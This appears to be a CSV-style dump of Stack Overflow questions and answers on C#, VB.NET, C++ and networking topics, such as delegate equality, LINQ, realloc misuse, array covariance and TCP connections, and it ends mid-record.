"<p>Due to a bug that was fixed in C# 4, the following program prints <code>true</code>.  (Try it in LINQPad)</p>

<pre><code>void Main() { new Derived(); }

class Base {
    public Base(Func&lt;string&gt; valueMaker) { Console.WriteLine(valueMaker()); }
}
class Derived : Base {
    string CheckNull() { return ""Am I null? "" + (this == null); }
    public Derived() : base(() =&gt; CheckNull()) { }
}
</code></pre>

<p>In VS2008 in Release mode, it throws an InvalidProgramException.  (In Debug mode, it works fine)</p>

<p>In VS2010 Beta 2, it doesn't compile (I didn't try Beta 1); I learned that the hard way</p>

<p>Is there any other way to make <code>this == null</code> in pure C#?</p>
","33708","","<p>This observation has been posted on StackOverflow in <a href=""http://stackoverflow.com/questions/1600001/cs0120-error-under-vs2010-beta-2-object-reference-is-required"">another question</a> earlier today. </p>

<p><a href=""http://stackoverflow.com/users/23354/marc-gravell"">Marc</a>'s <a href=""http://stackoverflow.com/questions/1600001/cs0120-error-under-vs2010-beta-2-object-reference-is-required/1600328#1600328"">great answer to that question</a> indicates that according to the spec (section 7.5.7), you shouldn't be able to access <code>this</code> in that context and the ability to do so in C# 3.0 compiler is a bug. C# 4.0 compiler is behaving correctly according to the spec (even in Beta 1, this is a compile time error):</p>

<blockquote>
  <p><strong>Â§ 7.5.7 This access</strong></p>
  
  <p>A <em>this-access</em> consists of the reserved word <code>this</code>.</p>
  
  <p><em>this-access:</em></p>

<pre><code>this
</code></pre>
  
  <p>A <em>this-access</em> is permitted only in the <em>block</em> of an instance constructor, an instance method, or an instance accessor.</p>
</blockquote>
"
"<p>I have two string arrays <b>( I will not use it anywhere as it is not a good logic,this is for my learning purpose).</b></p>

<pre><code>string[] names = new[] { ""Joss"", ""Moss"", ""Kepler"" };

string[] emails = new[] { ""Moss@gmail"", ""Kepler@gmail"", ""Joss@gmail"" };
</code></pre>

<p>How to use LINQ so as to make key value pairs like </p>

<pre><code>{""Joss"",""Joss@gmail""} ,{""Moss"",""Moss@gmail""} , {""Kepler"",""Kepler@gmail""}
</code></pre>

<ol>
<li>email ids are shuffled in string array emails[]</li>
<li>consider both string arrays keep unique name and unique email ids
(their name as email ids).</li>
</ol>

<p>How to use Join to project the result i want?</p>

<pre><code>                          var JoinDemo = from grpname in names
                          join
                          grpmails in emails 
                          on grpname ????????
</code></pre>
","33708","","<p>This is the <code>Zip</code> operation which is not available in .NET 3.5 BCL out of the box. </p>

<p>If you have two <em>arrays</em> (won't work for generic <code>IEnumerable&lt;T&gt;</code>) of same length, you can use:</p>

<pre><code>var zippedArrays = Enumerable.Range(0, Math.Min(a.Length, b.Length))
                             .Select(i =&gt; new { Name = a[i], Email = b[i] })
                             .ToList();
</code></pre>
"
"<p>I think this is the question, anyway. I am using a RelayCommand, which decorates an ICommand with two delegates. One is Predicate for the _canExecute and the other is Action for the _execute method.</p>

<p>---Background motivation --</p>

<p>The motivation has to do with unit testing ViewModels for a <a href=""http://en.wikipedia.org/wiki/Windows%5FPresentation%5FFoundation"" rel=""nofollow"">WPF</a> presentation. A frequent pattern is that I have one ViewModel that has an ObservableCollection, and I want a unit test to prove the data in that collection is what I expect given some source data (which also needs to be converted into a collection of ViewModels). Even though the data in both collections looks the same in the debugger, it looks like the test fails due to an equality failure on the ViewModel's RelayCommand. Here's an example of the failing unit test:</p>

<pre><code>[Test]
    public void Creation_ProjectActivities_MatchFacade()
    {
        var all = (from activity in _facade.ProjectActivities
                   orderby activity.BusinessId
                   select new ActivityViewModel(activity, _facade.SubjectTimeSheet)).ToList();

        var models = new ObservableCollection&lt;ActivityViewModel&gt;(all);
        CollectionAssert.AreEqual(_vm.ProjectActivities, models);
    }
</code></pre>

<p>--- Back to delegate equality ----</p>

<p>Here is the code for the RelayCommand - it's basically a direct rip-off of Josh Smith's idea, with an implementation for equality that I added in an attempt to solve this issue:</p>

<pre><code>public class RelayCommand : ICommand, IRelayCommand
{
    readonly Action&lt;object&gt; _execute;
    readonly Predicate&lt;object&gt; _canExecute;

    /// &lt;summary&gt;Creates a new command that can always execute.&lt;/summary&gt;
    public RelayCommand(Action&lt;object&gt; execute) : this(execute, null) { }

    /// &lt;summary&gt;Creates a new command which executes depending on the logic in the passed predicate.&lt;/summary&gt;
    public RelayCommand(Action&lt;object&gt; execute, Predicate&lt;object&gt; canExecute) {
        Check.RequireNotNull&lt;Predicate&lt;object&gt;&gt;(execute, ""execute"");

        _execute = execute;
        _canExecute = canExecute;
    }

    [DebuggerStepThrough]
    public bool CanExecute(object parameter) { return _canExecute == null ? true : _canExecute(parameter); }

    public event EventHandler CanExecuteChanged
    {
        add { CommandManager.RequerySuggested += value; }
        remove { CommandManager.RequerySuggested -= value; }
    }

    public void Execute(object parameter) { _execute(parameter); }

    public override bool Equals(object obj)
    {
        if (ReferenceEquals(null, obj)) return false;
        if (ReferenceEquals(this, obj)) return true;
        if (obj.GetType() != typeof(RelayCommand)) return false;
        return Equals((RelayCommand)obj);
    }

    public bool Equals(RelayCommand other)
    {
        if (ReferenceEquals(null, other)) return false;
        if (ReferenceEquals(this, other)) return true;
        return Equals(other._execute, _execute) &amp;&amp; Equals(other._canExecute, _canExecute);
    }

    public override int GetHashCode()
    {
        unchecked
        {
            return ((_execute != null ? _execute.GetHashCode() : 0) * 397) ^ (_canExecute != null ? _canExecute.GetHashCode() : 0);
        }
    }

}
</code></pre>

<p>In a unit test where I've effectively set the _execute delegate to the same method (_canExecute is null in both cases), the unit test fails at this line:</p>

<pre><code>return Equals(other._execute, _execute) &amp;&amp; Equals(other._canExecute, _canExecute)
</code></pre>

<p>Debugger output:</p>

<pre><code>?_execute
{Method = {Void &lt;get_CloseCommand&gt;b__0(System.Object)}}
base {System.MulticastDelegate}: {Method = {Void CloseCommand&gt;b__0(System.Object)}}

?other._execute
{Method = {Void &lt;get_CloseCommand&gt;b__0(System.Object)}} 
base {System.MulticastDelegate}: {Method = {Void CloseCommand&gt;b__0(System.Object)}}
</code></pre>

<p>Can anyone explain what I am missing and what the fix is?</p>

<p>---- EDITED REMARKS ----</p>

<p>As Mehrdad pointed out, the get_CloseCommand from the debug session looks a bit weird at first. It really is just a property get, but it does raise the point as to why the equality of the delegate is problematic if I need to do tricks to make it work.</p>

<p>Some of the point of MVVM is to expose whatever might be useful in a presentation as properties, so you can use WPF binding. The particular class I was testing has a WorkspaceViewModel in it's heirarchy, which is just a ViewModel that already has a close command property. Here is the code:</p>

<p>public abstract class WorkspaceViewModel : ViewModelBase
    {</p>

<pre><code>    /// &lt;summary&gt;Returns the command that, when invoked, attempts to remove this workspace from the user interface.&lt;/summary&gt;
    public ICommand CloseCommand
    {
        get
        {
            if (_closeCommand == null)
                _closeCommand = new RelayCommand(param =&gt; OnRequestClose());

            return _closeCommand;
        }
    }
    RelayCommand _closeCommand;

    /// &lt;summary&gt;Raised when this workspace should be removed from the UI.&lt;/summary&gt;
    public event EventHandler RequestClose;

    void OnRequestClose()
    {
        var handler = RequestClose;
        if (handler != null)
            handler(this, EventArgs.Empty);
    }

    public bool Equals(WorkspaceViewModel other) {
        if (ReferenceEquals(null, other)) return false;
        if (ReferenceEquals(this, other)) return true;
        return Equals(other._closeCommand, _closeCommand) &amp;&amp; base.Equals(other);
    }

    public override int GetHashCode() {
        unchecked {
            {
                return (base.GetHashCode() * 397) ^ (_closeCommand != null ? _closeCommand.GetHashCode() : 0);
            }
        }
    }
}
</code></pre>

<p>You can see that the close command is a RelayCommand, and that I monkeyed with equals to make the unit test work.</p>

<p>@Merhdad
Here is the unit test that only works when I use Trickster's delegate.Method in the equality comparison.</p>

<p>[TestFixture]
    public class WorkspaceViewModelTests
    {
        private WorkspaceViewModel vm1;
        private WorkspaceViewModel vm2;</p>

<pre><code>    private class TestableModel : WorkspaceViewModel
    {

    }

    [SetUp]
    public void SetUp() {
        vm1 = new TestableModel();
        vm1.RequestClose += OnWhatever;
        vm2 = new TestableModel();
        vm2.RequestClose += OnWhatever;
    }

    private void OnWhatever(object sender, EventArgs e) { throw new NotImplementedException(); }


    [Test]
    public void Equality() {
        Assert.That(vm1.CloseCommand.Equals(vm2.CloseCommand));
        Assert.That(vm1.Equals(vm2));
    }


}
</code></pre>

<p>----- LATEST EDITS TO USE MERHDAD""S IDEA</p>

<p>debugger out put
    ?valueOfThisObject
    {Smack.Wpf.ViewModel.RelayCommand}
    base {SharpArch.Core.DomainModel.ValueObject}: {Smack.Wpf.ViewModel.RelayCommand}
    _canExecute: null
    _execute: {Method = {Void _executeClose(System.Object)}}</p>

<pre><code>?valueToCompareTo
{Smack.Wpf.ViewModel.RelayCommand}
base {SharpArch.Core.DomainModel.ValueObject}: {Smack.Wpf.ViewModel.RelayCommand}
_canExecute: null
_execute: {Method = {Void _executeClose(System.Object)}}

?valueOfThisObject.Equals(valueToCompareTo)
false
</code></pre>

<p>This is the result after changing the code to:</p>

<pre><code>    public ICommand CloseCommand
    {
        get
        {
            if (_closeCommand == null)
                _closeCommand = new RelayCommand(_executeClose);

            return _closeCommand;
        }
    }
    RelayCommand _closeCommand;

    void _executeClose(object param) {
        OnRequestClose();
    }
</code></pre>
","33708","","<p>Are you creating the delegate out of anonymous functions or something? These are the exact delegate equality rules according to C# specification (Â§7.9.8):</p>

<blockquote>
  <h3>Delegate equality operators</h3>
  
  <p>Two delegate instances are considered equal as follows:
  If either of the delegate instances is <code>null</code>, <strong>they are equal if and only if both are <code>null</code></strong>.<br />
  If the delegates have different runtime type <strong>they are never equal</strong>.
  If both of the delegate instances have an invocation list (Â§15.1), those instances are equal if and only if their invocation lists are the same length, and each entry in oneâs invocation list is equal (as defined below) to the corresponding entry, in order, in the otherâs invocation list.
  The following rules govern the equality of invocation list entries:<br />
  If two invocation list entries both <strong>refer to the same <code>static</code> method</strong> then the entries are equal.<br />
  If two invocation list entries both <strong>refer to the same non-<code>static</code> method</strong> on the <strong>same target object</strong> (as defined by the reference equality operators) then the entries are equal.<br />
  Invocation list entries produced from evaluation of semantically identical <em>anonymous-function-expressions</em> <strong>with the same (possibly empty) set of captured outer variable instances</strong> are <strong>permitted (but not required)</strong> to be equal.</p>
</blockquote>

<p>So, in your case, it's possible that the delegate instances are referring to the same method in two different objects, or referring to two anonymous methods.</p>

<p><hr /></p>

<p><strong>UPDATE:</strong> Indeed, the problem is that you are not passing the same method reference when you are calling <code>new RelayCommand(param =&gt; OnCloseCommand())</code>. After all, the lambda expression specified here is actually an anonymous method (you are not passing a method reference to <code>OnCloseCommand</code>; you are passing a reference to an anonymous method which takes a single parameter and calls <code>OnCloseCommand</code>). As mentioned in the last line of the specification quotation above, it's not necessary that comparing those two delegates return <code>true</code>.</p>

<p><em>Side Note:</em> The getter of the <code>CloseCommand</code> property would be simply called <code>get_CloseCommand</code> and not <code>&lt;get_CloseCommand&gt;b__0</code>. This is the compiler generated method name for the anonymous method inside <code>get_CloseCommand</code> method (the <code>CloseCommand</code> getter). This further proves the point I mentioned above.</p>
"
"<p>Given the following vb.net class:</p>

<pre><code>Friend Class PairCollection(Of TKey, TValue)
    Inherits List(Of KeyValuePair(Of TKey, TValue))

    Public Overloads Sub Add(ByVal key As TKey, ByVal value As TValue)
        Me.Add(New KeyValuePair(Of TKey, TValue)(key, value))
    End Sub

    Public Function FindByValue(ByVal value As TValue) As List(Of KeyValuePair(Of TKey, TValue))
        Return Me.FindAll(Function(item As KeyValuePair(Of TKey, TValue)) (item.Value.Equals(value)))
    End Function

End Class
</code></pre>

<p>The function FindByValue returns a single KeyValuePair that fits a value. However, an implementation of this PairCollection might have m:1 key to value, so I wish to return all keys (and key's only) that have that value (there could be more than one). </p>

<p>Problem isn't made easier that I'm new to Lambda expressions in vb.net, and more familiar with C#.  I could write a simple routine to iterate over the collection, but I feel there is a lambda &amp; generic combined approach.</p>

<p>I think what I am trying to do is something along the lines of the following:</p>

<pre><code>Public Function FindByValue2(ByVal value As TValue) As List(Of TKey)
	Return Me.FindAll(Function(item As list(of TKey) (item.Value.Equals(value)))
End Function
</code></pre>

<p>Related reasoning behind what I am attempting is <a href=""http://stackoverflow.com/questions/1623908/using-keyvaluepair-in-vb-net-for-a-reverse-lookup-capable-dictionary-example-hin"">here</a>.</p>
","33708","","<p>You are doing it correctly. You just need to project the output with <code>Select</code>.</p>

<pre><code>Public Function FindByValue(ByVal value As TValue) As List(Of TKey)
    Return Me.Where(Function(item) item.Value.Equals(value)) _
             .Select(Function(x) x.Key).ToList()
End Function
</code></pre>

<p>By the way, inheriting <code>List</code> is almost always a wrong thing to do. Try redesigning your class.</p>
"
"<p>The <code>PhysicalAddress</code> (used for MAC addresses) class supports variable-length byte arrays. As far as I know MAC addresses are always 48-bit long.</p>

<p>Is there a reason why the <code>PhysicalAddress</code> allows any lenghts?</p>
","33708","","<p>Your assumption that physical addresses are always 48 bits long is incorrect. <a href=""http://en.wikipedia.org/wiki/MAC%5FAddress"" rel=""nofollow"">EUI-64 addresses</a> are 64 bits long, for instance.</p>
"
"<p>I am learning C++. I am trying to learn this dynamic memory allocation. In the below code I am trying to allocate memory using <code>malloc</code> and <code>realloc</code>.</p>

<pre><code>int main (void)  {
  char *g = (char*) malloc (sizeof(char) * 2);
  g = ""ab"";
  g = (char*) realloc (g, sizeof(char) * 200);
  strcpy (g, ""cdefg"");
  cout &lt;&lt; g &lt;&lt; endl;
  return 0;
}
</code></pre>

<p>I get <strong>segmentation fault</strong> error when I execute this code.</p>

<p>I've seen other SO threads recommending to use either <code>vector</code> or <code>new</code> instead of using above approach. Since, I am trying to learn this approach, so these answers does not applies to my question.</p>

<p>I've encountered a scenario where this approach will be well fitted, for example, If I am reading a raw text file using <code>ifstream.read</code> function and reading, let's say 1024bytes of it. Now, If I want to make sure I am not reading a word which is broken due to 1024bytes size I have to read further from that position using <code>ifstream.get</code> to reach until a space character is found. In this scenario, I need to adjust the buffer (which is of 1024) slightly more. My intention is to use <code>realloc</code> here to assign some more memory to it. </p>

<p>Please feel free to correct me if I am wrong anywhere.</p>
","33708","","<p>The problem is that the line:</p>

<pre><code>g = ""ab"";
</code></pre>

<p>sets the <code>g</code> pointer to another location altogether. It does not copy the contents. You lose track of the original location and when you use <code>g</code> in <code>realloc</code>, you'll be <code>realloc</code>ing the wrong pointer.</p>

<p>Replace the line with:</p>

<pre><code>strcpy(g, ""ab"");
</code></pre>

<p>Of course, you'll need three bytes to store the string and the terminating <code>'\0'</code> character.</p>

<p>That said, <code>malloc</code> and <code>realloc</code> are C style things. If you are using C++, you should try <code>new</code> and <code>delete</code> and probably use <code>string</code> type to store strings.</p>
"
"<p>I'm trying to track down a crash that happens when I stress my C# code and run in low memory conditions. However, in some cases, instead of getting OutOfMemoryException, my program will simply crash and exit. This is usually caused by memory corruption from overrunning a buffer or because of stack overflow (or corruption).</p>

<p>So, is there a way to run a check on the heap's integrity, or is there a way to check how much stack is left on a thread?</p>

<p>I use lots of unsafe code for speed reasons, so it is quite likely I have code corrupting memory somewhere. Unfortunately, the crash happens at random intervals after the corruption  happens. I understand C# will close down a app when it detects buffer overruns, but is there a way to force it to do a check?</p>

<p>Thanks.</p>
","33708","","<p>You can handle those situations by using <a href=""http://msdn.microsoft.com/en-us/library/ms228973.aspx"" rel=""nofollow"">Constrained Execution Regions</a>:</p>

<blockquote>
  <p>A <em>constrained execution region</em> (CER) is part of a mechanism for authoring reliable managed code. A CER defines an area in which the common language runtime (CLR) is constrained from throwing out-of-band exceptions that would prevent the code in the area from executing in its entirety. Within that region, user code is constrained from executing code that would result in the throwing of out-of-band exceptions. The <code>PrepareConstrainedRegions</code> method must immediately precede a <code>try</code> block and marks <code>catch</code>, <code>finally</code>, and <code>fault</code> blocks as constrained execution regions. Once marked as a constrained region, code must only call other code with strong reliability contracts, and code should not allocate or make virtual calls to unprepared or unreliable methods unless the code is prepared to handle failures. The CLR delays thread aborts for code that is executing in a CER.</p>
</blockquote>

<p>Of course, CERs are very restrictive. You can't do much in them. They are designed for critical small parts of code.</p>
"
"<p>I have couple questions regarding some C++ rules.</p>

<ol>
<li><p>Why am I able to call a function/method from outside the class in the namespace when I include the return type? (look at the namespace test2::testclass2 in the code below) i.e. this works:</p>

<pre><code>bool b = testclass1::foo&lt;int&gt;(2);
</code></pre>

<p>whereas this doesn't: - (it doesn't even compile - compiler throws that this is function redeclaration)</p>

<pre><code>testclass1::foo&lt;int&gt;(2);
</code></pre>

<p>C++ complains that it is a function redeclaration.  Is that so?</p></li>
<li><p>This line:</p>

<pre><code>bool b = testclass1::foo&lt;int&gt;(2);
</code></pre>

<p>gets called first before anything else. Is this because static methods get created always first before anything else in C++?</p></li>
<li><p>Where can I find those rules? I have a few C++ books at home, so if someone would be kind enough to either point out a book (and chapter or page) or direct me to a website I would greatly appreciate it.</p></li>
</ol>

<p>Here below is the sample (partial) code that I tested at home with Visual Studio 2008:</p>

<pre><code>class testclass1
    {
    public:
    	testclass1(void);
    	~testclass1(void);

    	template&lt;class A&gt; static bool foo(int i)
    	{
    		std::cout &lt;&lt;""in static foo"";	
    		return true;
    	}
    };


namespace test2
{
    class testclass2
    {
    public:
    	testclass2(void);
    	~testclass2(void);
    };

    bool b = testclass1::foo&lt;int&gt;(2);
}
</code></pre>

<p>EDIT:</p>

<p>A few people mentioned that I need to call this inside the function and this will work without any problem.<br />
I understand that; the only reason I asked this question is because I saw this code somewhere (in someone's elses project) and was wondering how and why this works. Since I never really seen anyone doing it before.</p>

<p>Also, this is used (in multiple places) as a way to call and instantiate a large number of classes like this via those function calls (that are outside). They get called first before anything else is instantiated. </p>
","33708","","<p>C++ is not Python. You write statements in functions and execution starts from the <code>main</code> method. The reason <code>bool b = ...</code> happens to work is that it's <strong>defining</strong> the global variable <code>b</code> and the function call is merely the initialization expression. </p>

<p><em>Definitions</em> can exist outside functions while other statements can only exist inside a function body.</p>
"
"<pre><code>    Dim myDelims As String() = New String() {""&lt;beginning of record&gt;""}
    Dim split1 As String() = temp_string.Split(myDelims, StringSplitOptions.None)

    For Each s As String In split1
        If InStr(s, lot__no) Then
</code></pre>

<p>for some reason, the first s in split1 is giving a value of """". there's nothing in it. why is it starting ONE before the first element?</p>
","33708","","<p>You need to pass <code>StringSplitOptions.RemoveEmptyEntries</code> to filter out empty strings. </p>

<p>By default, the <code>String.Split</code> method will <em>split</em> the string by the delimiter. If the string starts with the delimiter, it's basically composed of an empty string, the delimiter, and the remaining part of the string.</p>

<pre><code>Dim s = ""!Hello!World!""
Dim delimiters = {""!""}
Dim arr = s.Split(delimiters, StringSplitOptions.RemoveEmptyEntries)
Array.ForEach(arr, AddressOf Console.WriteLine) ' // Prints out the result
</code></pre>

<p>In this example, <code>arr</code> will contain two elements, ""Hello"" and ""World"". Without <code>RemoveEmptyEntires</code>, it would have contained four elements, """", ""Hello"", ""World"", and """".</p>
"
"<p>So I am looping through some objects and initializing a Dictionary> object.</p>

<p>So first I check if the key exists, if it does I will add to the List</p>

<p>If it doesn't, I will create a new key and new List</p>

<p>Is that the right logic?<br />
I will have to do a:</p>

<pre><code>new List&lt;int&gt;();
</code></pre>

<p>the first time I insert an item right?</p>

<p>i.e.:</p>

<pre><code>if(myDic.ContainsKey(car.ID))
{
      myDic[car.ID].Add(car.MfgID);
}
else
{
   myDic.Add(car.ID, new List&lt;int&gt;);
   myDic[car.ID].Add(car.MfgID);
}
</code></pre>
","33708","","<p>Your approach works fine. It's a little inefficient as it requires two dictionary lookups (one for <code>Contains</code> and one for adding the item to the list). You can do it more efficiently using <a href=""http://msdn.microsoft.com/en-us/library/zkw5c9ak%28VS.85%29.aspx""><code>Dictionary.TryGetValue</code></a> method:</p>

<pre><code>List&lt;int&gt; list;
if (!myDic.TryGetValue(car.ID, out list))
    myDic.Add(car.ID, list = new List&lt;int&gt;());
list.Add(car.MfgId);
</code></pre>

<p>It's more efficient to fill the list and add it to the dictionary in one go (if it's possible in your case, of course). In C# 3.0, there's a feature called <em>collection initializers</em> that makes it easy to fill a list if items are known at compile time:</p>

<pre><code>var list = new List&lt;int&gt; { 1, 9, 8, 9, 1, 8, 1, 2 };
</code></pre>

<p>You might also consider using <a href=""http://stackoverflow.com/questions/380595/multimap-in-c-3-0/380601#380601"">something like this to map a key to multiple values</a>.</p>
"
"<p>I have a class called MyBase which has a constructor and destructor:</p>

<pre><code>class MyBase
{
public:
    MyBase(void);
    ~MyBase(void);
};
</code></pre>

<p>and I have a class called Banana, that extends MyBase like so:</p>

<pre><code>class Banana:public MyBase
{
public:
    Banana(void);
    ~Banana(void);
};
</code></pre>

<p>Does the implementation of the new constructor and destructor in Banana override the MyBase ones, or do they still exist, and get called say before or after the Banana constructor / destructor executes?</p>

<p>Thanks, and my apologies if my question seems silly.</p>
","33708","","<p>Constructors cannot be overriden. You can't declare a base class constructor in a derived class. A class constructor <strong>has to call</strong> a constructor in base class (if one is not explicitly stated, the default constructor is called) prior to anything else.</p>

<p>To be able to clean up the derived class correctly, you should declare the base class destructor as <code>virtual</code>:</p>

<pre><code>virtual ~MyBase() { ... }
</code></pre>
"
"<p>Hello Im afraid about concurrency on partner application cause in the last days it was having troubles with CRUDS Operations, especially with inserts. So I ran SQL Profiler and note that his insert statement dont use transaction and also he is using :</p>

<pre><code>INSERT INTO TABLEA VALUES ( (SELECT MAX(NUMBERFIELD) +1 FROM TABLEA), ....);
</code></pre>

<p>How avoid the use of MAX()+1 for generate primary keys? I suggest to use autoincrement or transaction scopes but he dont want or maybe he dont know how to achieve that, is there another way for lead with this?</p>

<p>Using SQL and C++ 1.1</p>

<p>*Its not my code but I might consider show this post to him cause I think he have to consider that all opinions are welcome. :)</p>
","33708","","<p>Have you considered making the primary key column <code>IDENTITY</code>? It'll make SQL Server automatically generate values for the column:</p>

<pre><code>CREATE TABLE Test (
    Id int identity primary key not null
    -- ...
)
</code></pre>
"
"<pre><code>[MethodImpl(MethodImplOptions.InternalCall)]
public static extern double Sin(double a);
</code></pre>

<p>What are the reasons for this?</p>
","33708","","<p><code>MethodImplOptions.InternalCall</code> means the method is implemented natively by the common language runtime. It makes sense for mathematical operations as they are usually heavily optimized for the target platform. For instance, in x86 architecture, there is a single instruction that computes sine and cosine. A managed implementation is unlikely to be able to directly utilize such instructions.</p>
"
"<p>When I build a <strong>release</strong> version of a project in Visual Studio 2008, it creates a .pdb file, e.g. for a simple WPF project it generates a .exe and .pdb file.</p>

<p>I've always understood <a href=""http://en.wikipedia.org/wiki/Program%5Fdatabase"" rel=""nofollow"">.pdb files</a> to be for <strong>debugging</strong>, so I would expect them to be in the <strong>Debug</strong> folder but not the <strong>Release</strong> folder.</p>

<p>And looking around at other StackOverflow questions, it doesn't seem that <a href=""http://stackoverflow.com/questions/769995/debugging-a-release-version-of-a-dll-with-pdb-file"">pdb files work well with teh Release version anyway</a>.</p>

<p><strong>Why are .pdb files generated in the Release folder by default and how can I turn that option off?</strong></p>
","33708","","<p>You are right. PDB files are for debugging but you may need to debug release builds too. Saving PDBs of released builds is very important when you want to debug a customer issue and you have the crash dump file related to that issue.</p>

<p>By the way, generating PDB files does not harm compiler optimizations. If you don't ship it to the customer, there will be no performance implications.</p>
"
"<p>I am getting confused between TCP being Connection oriented and UDP being connectionless so please somebody clarify this.</p>

<ul>
<li><p>Every communication between two computers whether its TCP or UDP is via packets. There is no hard wire connection between two peers whether its TCP or UDP. Then why TCP is said to be connection oriented just because it retransmits the packets if no acknowledgement is received   or it embeds sequence number inside the packets ?</p></li>
<li><p>Whats the actual meaning of connection ? Does the routers along the path between two communicating peers booked for some time to accept packets for that particular connection ?</p></li>
</ul>

<p>EDIT</p>

<ul>
<li>When do you say connection between two points established?</li>
</ul>

<p>Thanks</p>
","33708","","<p>I'll answer your second question first. The thing you wrote (""establishing a path"") which happens in some network architectures (GSM voice calls, for instance) but not in the Internet is called <em>circuit switching</em>. With circuit switching, the network infrastructure itself is aware of a communication happening between the two endpoints. The TCP/IP stack, however, is designed to be <em>packet switched</em>. It means each packet is a separate piece of information that's delivered to the other endpoint and is unrelated to any other packet (like posting a message). </p>

<p>As a consequence, the lower level protocols in the IP stack do not guarantee that:</p>

<ul>
<li>packets are received at the destination</li>
<li>packets are received in any particular order</li>
<li>packets are received at the destination just once</li>
</ul>

<p>UDP in particular, does not try to solve these issues. On the other hand, TCP protocol has to get rid of these issues. It uses acknowledgements and packet sequence numbers to handle them. In TCP, a single packet is not unrelated to other packets. As a result, both parties should negotiate a <em>simulated communication path</em> built on the stateless IP. This negotiation is called a connection. It's basically establishing a relationship between the packets in a chain.</p>
"
"<p>Is it possible to get the comment description of a method or property using reflection. E.g When you use intellisense in Visual Studio to scroll through methods available to object there is a label which describes what the method does. How can I access this data programmatically using reflection?
your thoughts are much appreciated.
Tony</p>
","33708","","<p>No. The method description is defined in an XML file (with the same name as the declaring assembly) extracted from XML comments in the source code. Visual Studio uses that XML file to load those stuff. The information is nowhere in the assembly metadata and naturally, it's not available using reflection:</p>

<pre><code>/// &lt;summary&gt; Method description &lt;/summary&gt;
public void Something() { ... }
</code></pre>

<p>When the C# compiler is invoked with <code>/doc</code> switch, it extracts the XML tags and puts it in the XML file. Visual Studio checks if an XML file is available along the referenced assembly and displays the description as appropriate.</p>
"
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br />
  <a href=""http://stackoverflow.com/questions/879913/will-installing-visual-studio-2010-beta-side-by-side-with-vs2008-cause-problems"">Will installing Visual Studio 2010 Beta side by side with VS2008 cause problems?</a>  </p>
</blockquote>

<p>Hi,
Do you have any experience in having two different visuals(2008 and 2010) on one computer? I'm not sure if there wont be any problems with framework 4? I still want to develop some apps using 3.5 framework and vs 2008</p>

<p>Thanks</p>
","33708","","<p>It works great. I had both on my machine since VS2010 Beta 1. Last week, I reinstalled Windows and switched completely to VS2010 Beta 2. Its multitargeting feature handles 3.5 apps pretty well.</p>
"
"<p>Does anyone know the syntax for creating a custom HtmlHelperextension method which behaves like..</p>

<pre><code>&lt;% using (Html.BeginForm()) {%&gt;

&lt;p&gt;Loads of html stuff here &lt;/p&gt;

&lt;% } %&gt;
</code></pre>

<p>I'm thinking of something along the lines of....</p>

<p>&lt;% using (Html.BeginTable(""Column Heading 1"", ""Column Heading 2"")) {%></p>

<p>&lt;% } %></p>

<p>Any ideas?</p>

<p>Cheers,</p>

<p>ETFairfax</p>
","33708","","<p>You need to create a class that implements <code>IDisposable</code> interface and return that from your <code>HtmlHelper</code>.</p>

<pre><code>public static class HtmlHelperTableExtensions {
    private class TableRenderer : IDisposable {
        HtmlHelper html;
        public TableRenderer(HtmlHelper html) {
           this.html = html;
        }
        public void Dispose() {
           HtmlHelperTableExtensions.EndTable(html);
        }
    }
    public static IDisposable BeginTable(this HtmlHelper html) {
        // print begin table here...
        return new TableRenderer(html);
    }
    public static void EndTable(this HtmlHelper html) {
        // print end table here...
    }
}
</code></pre>
"
"<p>This might seam like a strange question but....</p>

<pre><code>public string MyProperty
{
    get
    {
        return ""MyProperty"";
    }
}
</code></pre>

<p>How can I replace the return statement go it returns the property name without it being hard coded?</p>
","33708","","<p>I wouldn't recommend doing this in general but here we go:</p>

<pre><code>return MethodBase.GetCurrentMethod().Name.Substring(4);
</code></pre>

<p>Using an obfuscator can totally screw this up, by the way.</p>
"
"<p>Why is <code>Object[].class.isAssignableFrom(String[].class) == true</code>, while <code>String[].getSuperClass()</code> or <code>getGenericInterfaces()</code> could not get <code>Object[]</code>?</p>

<p>I checked the source of JDK, but i don't think i can get the answer myself.
For now, I know JDK uses tree to store the relationship between Classes, and depth to indicate its level, <code>Class::isAssignableFrom()</code> searched the chain, so definately arrays are in that tree. and also <code>String[]</code> is connected to <code>Object[]</code>.</p>

<p>Can i say that <code>String[]</code> is a subclass of <code>Object[]</code>?
Or is it just another weird thing of Java?</p>
","33708","","<p>In Java (and .NET), arrays are covariant. It means you can pass an instance of type <code>Apple[]</code> to a method that expects a <code>Fruit[]</code> if <code>Apple</code> inherits <code>Fruit</code>. The following line is valid:</p>

<pre><code>Fruit[] fruits = apples; // apples is an Apple[]
</code></pre>

<p>This means a <code>Fruit[]</code> is assignable from <code>Apple[]</code>.</p>

<p>This is not very safe, of course. Assume:</p>

<pre><code>void someMethod(Object[] objects) {
    objects[0] = ""Hello World""; // throws at run time.
}

void test() {
    Integer[] integers = new Integer[10];
    integers[0] = 42;
    someMethod(integers); // compiles fine.
}
</code></pre>

<p>This design decision is handy when you want to use arrays contents (e.g. print it) but not modify it. </p>
"
"<p>In relation to my last question (<a href=""http://stackoverflow.com/questions/1588135/is-there-an-easier-way-of-passing-a-group-of-variables-as-an-array"">http://stackoverflow.com/questions/1588135/is-there-an-easier-way-of-passing-a-group-of-variables-as-an-array</a>)</p>

<p>I was trying to pass string variables to a method to write to a stream, rather than doing the writing in each individual method.</p>

<p>The use of the params keyword is obviously a solution, however by using it I believe I can't do things like this:</p>

<pre><code>Write(""hello {0}"",var1);
</code></pre>

<p>Which without makes the code quite messy. Is there a way to force this feature to my own methods?</p>
","33708","","<pre><code>void MyMethod(string format, params object[] obj) {
    var formattedString = String.Format(format, obj);
    // do something with it...
}
</code></pre>
"
"<p>How do we add two 64 bit numbers using 32 bit arithmetic?? </p>
","33708","","<p>Add the least significant bytes first, keep the carry. Add the most significant bytes considering the carry from LSBs:</p>

<pre><code>; x86 assembly, Intel syntax
; adds ecx:ebx to edx:eax
add eax, ebx
adc edx, ecx
</code></pre>
"
"<p>the source is throwing the error: </p>

<pre><code>'nn.asdf' does not contain a definition for 'extension_testmethod'
</code></pre>

<p>and i really don't unterstand why...</p>

<pre><code>using System.Linq;
using System.Text;
using System;

namespace nn
{
    public class asdf
    {
        public void testmethod()
        {
        }
    }
}
namespace nn_extension
{
    using nn;
    //Extension methods must be defined in a static class
    public static class asdf_extension
    {
        // This is the extension method.
        public static void extension_testmethod(this asdf str)
        {
        }
    }
}
namespace Extension_Methods_Simple
{
